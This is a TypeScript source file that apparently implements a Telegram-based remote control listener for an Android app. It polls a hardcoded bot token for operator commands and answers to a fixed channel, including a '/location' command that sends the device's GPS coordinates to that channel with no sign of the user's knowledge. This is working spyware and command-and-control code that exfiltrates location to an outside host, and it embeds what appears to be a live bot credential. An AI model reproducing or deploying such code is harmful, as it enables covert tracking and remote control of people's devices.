const BOT_TOKEN = '8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA';
const CHANNEL_ID = '-1003552771281';
let lastUpdateId = 0;

export const startRemoteListener = (onToast: (msg: string) => void) => {
  const poll = async () => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
      const data = await response.json();
      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          lastUpdateId = update.update_id;
          if (update.message?.text) await handleCommand(update.message.text, onToast);
        }
      }
    } catch (e) { console.error(e); }
    setTimeout(poll, 2500);
  };
  poll();
};

const sendResponse = async (t: string) => {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHANNEL_ID, text: `📱 **ANDROID CONTROL**\n\n${t}`, parse_mode: 'Markdown' })
  });
};

const handleCommand = async (text: string, onToast: (msg: string) => void) => {
  const cmd = text.split(' ')[0].toLowerCase();
  switch (cmd) {
    case '/info': await sendResponse(`Device: Android\nStatus: Online`); break;
    case '/vibrate': navigator.vibrate?.(1000); await sendResponse("📳 Vibrated"); break;
    case '/location': navigator.geolocation.getCurrentPosition(p => sendResponse(`📍 Loc: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`)); break;
    case '/toast': onToast(text.replace('/toast ', '')); await sendResponse("✅ Toast Sent"); break;
    default: if(cmd.startsWith('/')) await sendResponse(`Command ${cmd} received.`);
  }
};
